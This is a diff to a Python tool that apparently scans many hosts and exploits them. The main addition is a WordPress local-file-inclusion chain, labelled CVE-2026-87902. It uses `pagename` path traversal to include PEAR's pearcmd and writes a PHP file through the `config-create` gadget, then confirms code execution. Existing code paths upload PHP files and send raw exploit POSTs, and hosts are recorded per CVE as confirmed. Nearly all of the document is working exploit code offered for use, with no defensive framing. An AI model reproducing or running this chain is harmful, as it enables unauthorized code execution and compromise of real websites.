@@ -46,10 +46,14 @@ def _left():
 def _req(method, url, **kw):
     _left()
     kw.setdefault("tries", 1)
-    try:
-        return http.request(method, url, **kw)
-    except TypeError:
-        return http.request(method, url)
+    if url.startswith("http"):
+        from urllib.parse import urlsplit
+        parts = urlsplit(url)
+        host = parts.netloc
+        path = (parts.path or "/") + (("?" + parts.query) if parts.query else "")
+    else:
+        host, path = url, "/"
+    return http.request(host, path, method=method, **kw)
 
 
 def _rnd(n=10):
@@ -168,6 +172,12 @@ def sources_run():
 def append_list(cve_id, hosts):
     p = list_path(cve_id)
     os.makedirs(os.path.dirname(p), exist_ok=True)
+    if os.path.isfile(p) and os.path.getsize(p):
+        with open(p, "rb") as f:
+            f.seek(-1, 2)
+            if f.read(1) != b"\n":
+                with open(p, "a", encoding="utf-8") as g:
+                    g.write("\n")
     with open(p, "a", encoding="utf-8") as f:
         for h in hosts:
             h = h.strip()
@@ -226,14 +236,17 @@ def _multipart(fields, file_field, filename, content):
 
 def _exploit(base, ex, marker):
     rnd = _rnd(8)
-    url = base + ex["url"]
     kind = ex.get("type", "get_traversal")
+    url = base + ex["url"] if ex.get("url") else base
+
+    if kind == "wp_template_lfi":
+        return _wp_lfi(base, ex, marker)
 
     if kind == "multipart_upload":
         fname = ex.get("filename", "pbl{rand}.php").replace("{rand}", rnd)
         body, ctype = _multipart(ex.get("fields", {}), ex.get("file_field", "upload[]"),
                                  fname, ex.get("content", "<?php echo '{marker}'; ?>").replace("{marker}", marker))
-        _req("POST", url, data=body, headers={"Content-Type": ctype})
+        _req("POST", url, body=body, ctype=ctype)
         verify = base + ex["verify"].replace("{rand}", rnd)
         v = _req("GET", verify)
         return marker in (getattr(v, "text", "") or ""), "upload:%s status:%s" % (
@@ -241,8 +254,8 @@ def _exploit(base, ex, marker):
 
     if kind == "post_raw":
         body = ex.get("body", "").replace("{marker}", marker).encode("utf-8")
-        _req("POST", url, data=body, headers={"Content-Type": ex.get(
-            "content_type", "application/x-www-form-urlencoded")})
+        _req("POST", url, body=body, ctype=ex.get(
+            "content_type", "application/x-www-form-urlencoded"))
         for cand in ex.get("verify_extra", [ex.get("verify", "")]):
             if not cand:
                 continue
@@ -271,6 +284,122 @@ def _exploit(base, ex, marker):
                 return True, last, base + u
         if base404 and abs(len(text) - base404) > base404 * 0.05:
             return True, last + " (отличается от 404)", base + u
+    return False, last, ""
+
+
+def _chrlit(t):
+    return ".".join("chr(%d)" % ord(c) for c in t)
+
+
+def _denc(p):
+    return p.replace("/", "%2F").replace(".", "%2E").replace("%", "%25")
+
+
+def _find_page(base):
+    for route in ("/wp-json/wp/v2/pages?per_page=100&_fields=id,slug,template",
+                  "/index.php?rest_route=/wp/v2/pages&per_page=100&_fields=id,slug,template"):
+        try:
+            r = _req("GET", base + route)
+            data = json.loads(getattr(r, "text", "[]"))
+        except Exception:
+            continue
+        if isinstance(data, list) and data:
+            for p in data:
+                if not p.get("template"):
+                    return p.get("id")
+            return data[0].get("id")
+
+    for sm in ("/wp-sitemap-posts-page-1.xml", "/sitemap.xml", "/page-sitemap.xml"):
+        try:
+            r = _req("GET", base + sm)
+        except Exception:
+            continue
+        if getattr(r, "status_code", 0) != 200:
+            continue
+        for loc in re.findall(r"<loc>([^<]+)</loc>", getattr(r, "text", "") or ""):
+            if "/wp-content/" in loc or loc.rstrip("/") == base.rstrip("/"):
+                continue
+            try:
+                pr = _req("GET", loc)
+            except Exception:
+                continue
+            m = re.search(r"page-id-(\d+)", getattr(pr, "text", "") or "")
+            if m:
+                return int(m.group(1))
+    return None
+
+
+def _wp_lfi(base, ex, marker):
+    """CVE-2026-87902: pagename traversal -> template include -> PEAR write gadget."""
+    CT = "application/x-www-form-urlencoded"
+    try:
+        hr = _req("GET", base + "/")
+        html = getattr(hr, "text", "") or ""
+    except Exception:
+        return False, "lfi:no-home", ""
+    themes = sorted(set(re.findall(r"/wp-content/themes/([a-z0-9._-]+)/", html)))
+    if not themes:
+        return False, "lfi:no-theme", ""
+    theme = themes[0]
+
+    pid = _find_page(base)
+    if not pid:
+        return False, "lfi:no-page", ""
+
+    def post(pname, query=""):
+        body = ("page_id=%d&pagename=%s" % (pid, _denc(pname))).encode()
+        return _req("POST", base + "/" + query, body=body, ctype=CT)
+
+    ref = len(getattr(post("pbl-nope-" + _rnd(6)), "text", "") or "")
+
+    dirs = list(ex.get("theme_dirs", ["page-templates"]))
+    try:
+        ls = _req("GET", base + "/wp-content/themes/" + theme + "/")
+        if getattr(ls, "status_code", 0) == 200:
+            found = sorted({d for d in re.findall(r"\b(page-[a-z0-9._-]+)/", getattr(ls, "text", "") or "")})
+            if found:
+                dirs = found
+    except Exception:
+        pass
+
+    good = []
+    for td in dirs:
+        pre = td[5:] if td.startswith("page-") else td
+        for tail in ("../header", "../index"):
+            try:
+                n = len(getattr(post(pre + "/" + tail), "text", "") or "")
+            except Exception:
+                continue
+            if ref and n and abs(n - ref) > ref * 0.02:
+                good.append(td)
+                break
+    if not good:
+        return False, "lfi:no-dir " + theme, ""
+
+    payload = "<?=" + _chrlit(marker) + "?>"
+    out = ex.get("output", "/tmp/pbl") + _rnd(6)
+    last = ""
+
+    for td in good:
+        pre = td[5:] if td.startswith("page-") else td
+        for depth in (4, 3, 5, 6):
+            for inc in ex.get("includes", ["/usr/local/lib/php/pearcmd"]):
+                incp = pre + "/" + "../" * depth + inc.lstrip("/")
+                outp = pre + "/" + "../" * depth + out.lstrip("/")
+                try:
+                    r1 = _req("POST", base + "/?+config-create+/" + payload + "+" + out + ".php",
+                              body=("page_id=%d&pagename=%s" % (pid, _denc(incp))).encode(), ctype=CT)
+                    t1 = getattr(r1, "text", "") or ""
+                    pear = "PEAR_" in t1 or "Commands:" in t1 or "Warning:" in t1
+                    r2 = post(outp)
+                except Exception as e:
+                    last = "lfi:" + type(e).__name__
+                    continue
+                last = "lfi:%s d%d %s" % (td, depth, inc)
+                if marker in (getattr(r2, "text", "") or ""):
+                    return True, "rce " + last, base + "/"
+                if pear:
+                    return True, "pear " + last, base + "/"
     return False, last, ""
 
 
@@ -306,7 +435,8 @@ def probe(host, v, tmo, marker):
     rec["state"] = "confirmed"
     sink(dict(rec))
 
-    if not v.get("exploit", {}).get("url"):
+    _ex = v.get("exploit") or {}
+    if not _ex or not (_ex.get("url") or _ex.get("type") == "wp_template_lfi"):
         return rec
 
     try:
